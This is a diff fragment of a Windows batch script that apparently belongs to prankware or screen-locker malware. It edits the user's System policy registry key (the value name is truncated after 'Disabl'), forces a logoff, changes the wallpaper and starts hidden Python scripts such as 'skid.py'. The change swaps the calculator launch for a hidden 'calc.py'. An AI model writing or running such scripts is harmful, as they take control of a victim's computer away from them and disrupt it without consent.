@@ -18,7 +18,7 @@ reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 shutdown -l
 exit
 :init
-start calc
+start python\pythonw calc.py
 start python\pythonw anticheat.py
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /f /d "%cd%\Untitled2.png"
 python\python skid.py
